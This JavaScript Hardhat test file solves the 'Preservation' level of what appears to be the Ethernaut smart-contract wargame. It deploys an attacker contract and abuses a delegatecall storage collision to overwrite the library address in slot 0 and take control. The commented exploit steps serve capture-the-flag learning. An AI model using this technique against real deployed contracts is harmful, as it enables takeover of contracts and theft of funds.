const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Preservation", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Preservation", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // This one was kinda tricky
        // First, we need to deploy the attacker contract
        // Secondly, we need to call `setFirstTime` ot `setSecondTime` passing 
        // the address of the attacker contract casted to uint256 type as `_timeStamp`
        // Then, since the `timeZone1Library` and `storedTime` are both located in storage slot 0
        // the `timeZone1Library` will get overriden with the value we pass as `_timeStamp` (the attacker contract address)
        // Finally, we call the `setFirstTime` which will delegatecall the attacker contract address located at slot 0
        const attacker = await (await ethers.getContractFactory("PreservationAttack")).connect(player).deploy();
        await instance.connect(player).setFirstTime(ethers.BigNumber.from(attacker.address));
        await instance.connect(player).setFirstTime(0);
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});